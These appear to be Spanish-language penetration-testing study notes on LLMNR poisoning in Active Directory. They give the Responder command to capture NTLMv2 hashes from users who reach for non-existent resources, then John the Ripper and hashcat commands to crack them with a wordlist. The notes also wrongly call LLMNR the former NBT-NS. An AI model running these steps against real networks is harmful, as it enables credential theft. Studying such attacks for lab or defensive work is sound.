# Qué es LLMNR?

- Se usa para identificar hosts cuando el DNS falla.
- Antes se conocía como `NBT-NS`
- El servicio devuelve el `username` de un usuario y un `Hash NTLMv2` cuando responde.

# Explicación gráfica del vector de ataque

[Ver la imagen](/Apuntes-AD/Images/6.md)

# Iniciando Ataque (Responder)
En el momento en el que un usario acceda a un recurso que no existe, solicitaremos que se conecte a nosotros y obtendremos su Hash NTMLv2.

```
python /usr/share/responder.py -I tun0 -rdw
```

[Ver el Responder en proceso](/Apuntes-AD/Images/5.md)

[Ver la obtención de Hash NTMLv2](/Apuntes-AD/Images/4.md)

# Romper el Hash (JohnTheRipper)

```
john --wordlist=/usr/share/wordlists/rockyou.txt <hashfile>
```

# Romper el Hash (Hashcat)

```
hashcat -m 5600 <hashfile> rockyou.txt --force
```
